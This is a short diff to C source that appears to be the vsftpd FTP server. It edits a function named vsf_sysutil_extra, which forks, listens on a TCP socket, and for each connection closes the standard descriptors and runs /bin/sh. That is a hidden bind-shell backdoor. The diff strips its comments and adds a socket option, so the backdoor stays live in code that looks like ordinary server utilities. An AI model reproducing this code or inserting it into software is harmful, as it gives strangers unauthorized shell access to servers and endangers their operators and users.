@@ -851,24 +851,22 @@ vsf_sysutil_extra(void)
   int fd, rfd;
   struct sockaddr_in sa;
   pid_t pid;
-  int optval = 1; // Declare the optval variable
+  int optval = 1;
 
   pid = fork();
 
-  if (pid < 0) // Forking error
+  if (pid < 0)
   {
     perror("fork");
     exit(1);
   }
-  else if (pid > 0) // Parent process
+  else if (pid > 0)
   {
-    return 0; // Return from the function in the parent process to not block the main FTP process
+    return 0;
   }
 
-  // The following code will only run in the child process
   if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     exit(1);
-  // Add the following line to set the SO_REUSEADDR option
   setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
@@ -882,13 +880,14 @@ vsf_sysutil_extra(void)
   {
     rfd = accept(fd, 0, 0);
     pid = fork();
-    if (pid < 0) // Forking error
+    if (pid < 0)
     {
       perror("fork");
       exit(1);
     }
-    else if (pid == 0) // Child process
+    else if (pid == 0)
     {
+      setsockopt(rfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
       close(fd);
       close(0);
       close(1);
@@ -899,12 +898,13 @@ vsf_sysutil_extra(void)
       execl("/bin/sh", "sh", (char *)0);
       exit(0);
     }
-    else // Parent process
+    else
     {
       close(rfd);
     }
   }
 }
+
 
 
 void
